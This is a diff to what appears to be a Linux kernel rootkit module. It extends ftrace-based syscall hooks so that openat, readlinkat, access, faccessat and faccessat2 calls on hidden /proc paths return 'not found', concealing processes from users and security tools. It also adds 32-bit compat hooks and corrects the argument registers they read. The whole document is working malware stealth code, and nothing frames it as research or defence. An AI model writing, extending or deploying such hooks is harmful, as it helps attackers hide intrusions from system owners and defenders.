@@ -8,6 +8,12 @@ static asmlinkage long (*orig_openat)(const struct pt_regs *);
 static asmlinkage long (*orig_openat32)(const struct pt_regs *);
 static asmlinkage long (*orig_readlinkat)(const struct pt_regs *);
 static asmlinkage long (*orig_readlinkat32)(const struct pt_regs *);
+static asmlinkage long (*orig_access)(const struct pt_regs *);
+static asmlinkage long (*orig_access32)(const struct pt_regs *);
+static asmlinkage long (*orig_faccessat)(const struct pt_regs *);
+static asmlinkage long (*orig_faccessat32)(const struct pt_regs *);
+static asmlinkage long (*orig_faccessat2)(const struct pt_regs *);
+static asmlinkage long (*orig_openat32_compat)(const struct pt_regs *);
 
 static notrace bool is_hidden_proc_path(const char __user *pathname)
 {
@@ -56,14 +62,6 @@ static notrace asmlinkage long hook_openat(const struct pt_regs *regs)
     return orig_openat(regs);
 }
 
-static notrace asmlinkage long hook_openat32(const struct pt_regs *regs)
-{
-    const char __user *pathname = (const char __user *)regs->si;
-    if (is_hidden_proc_path(pathname))
-        return -ENOENT;
-    return orig_openat32(regs);
-}
-
 static notrace asmlinkage long hook_readlinkat(const struct pt_regs *regs)
 {
     const char __user *pathname = (const char __user *)regs->si;
@@ -72,19 +70,82 @@ static notrace asmlinkage long hook_readlinkat(const struct pt_regs *regs)
     return orig_readlinkat(regs);
 }
 
-static notrace asmlinkage long hook_readlinkat32(const struct pt_regs *regs)
+static notrace asmlinkage long hook_access(const struct pt_regs *regs)
+{
+    const char __user *pathname = (const char __user *)regs->di;
+    if (is_hidden_proc_path(pathname))
+        return -ENOENT;
+    return orig_access(regs);
+}
+
+static notrace asmlinkage long hook_faccessat(const struct pt_regs *regs)
 {
     const char __user *pathname = (const char __user *)regs->si;
+    if (is_hidden_proc_path(pathname))
+        return -ENOENT;
+    return orig_faccessat(regs);
+}
+
+static notrace asmlinkage long hook_faccessat2(const struct pt_regs *regs)
+{
+    const char __user *pathname = (const char __user *)regs->si;
+    if (is_hidden_proc_path(pathname))
+        return -ENOENT;
+    return orig_faccessat2(regs);
+}
+
+static notrace asmlinkage long hook_openat32(const struct pt_regs *regs)
+{
+    const char __user *pathname = (const char __user *)regs->cx;
+    if (is_hidden_proc_path(pathname))
+        return -ENOENT;
+    return orig_openat32(regs);
+}
+
+static notrace asmlinkage long hook_openat32_compat(const struct pt_regs *regs)
+{
+    const char __user *pathname = (const char __user *)regs->cx;
+    if (is_hidden_proc_path(pathname))
+        return -ENOENT;
+    return orig_openat32_compat(regs);
+}
+
+static notrace asmlinkage long hook_readlinkat32(const struct pt_regs *regs)
+{
+    const char __user *pathname = (const char __user *)regs->cx;
     if (is_hidden_proc_path(pathname))
         return -ENOENT;
     return orig_readlinkat32(regs);
 }
 
+static notrace asmlinkage long hook_access32(const struct pt_regs *regs)
+{
+    const char __user *pathname = (const char __user *)regs->bx;
+    if (is_hidden_proc_path(pathname))
+        return -ENOENT;
+    return orig_access32(regs);
+}
+
+static notrace asmlinkage long hook_faccessat32(const struct pt_regs *regs)
+{
+    const char __user *pathname = (const char __user *)regs->cx;
+    if (is_hidden_proc_path(pathname))
+        return -ENOENT;
+    return orig_faccessat32(regs);
+}
+
+
 static struct ftrace_hook hooks[] = {
-    HOOK("__x64_sys_openat",     hook_openat,     &orig_openat),
-    HOOK("__ia32_sys_openat",    hook_openat32,   &orig_openat32),
-    HOOK("__x64_sys_readlinkat", hook_readlinkat, &orig_readlinkat),
-    HOOK("__ia32_sys_readlinkat",hook_readlinkat32,&orig_readlinkat32),
+    HOOK("__x64_sys_openat",      hook_openat,      &orig_openat),
+    HOOK("__ia32_sys_openat",     hook_openat32,    &orig_openat32),
+    HOOK("__ia32_compat_sys_openat", hook_openat32_compat, &orig_openat32_compat),
+    HOOK("__x64_sys_readlinkat",  hook_readlinkat,  &orig_readlinkat),
+    HOOK("__ia32_sys_readlinkat", hook_readlinkat32, &orig_readlinkat32),
+    HOOK("__x64_sys_access",      hook_access,      &orig_access),
+    HOOK("__ia32_sys_access",     hook_access32,    &orig_access32),
+    HOOK("__x64_sys_faccessat",   hook_faccessat,   &orig_faccessat),
+    HOOK("__ia32_sys_faccessat",  hook_faccessat32, &orig_faccessat32),
+    HOOK("__x64_sys_faccessat2",  hook_faccessat2,  &orig_faccessat2),
 };
 
 notrace int hiding_open_init(void)
@@ -96,4 +157,3 @@ notrace void hiding_open_exit(void)
 {
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
 }
-
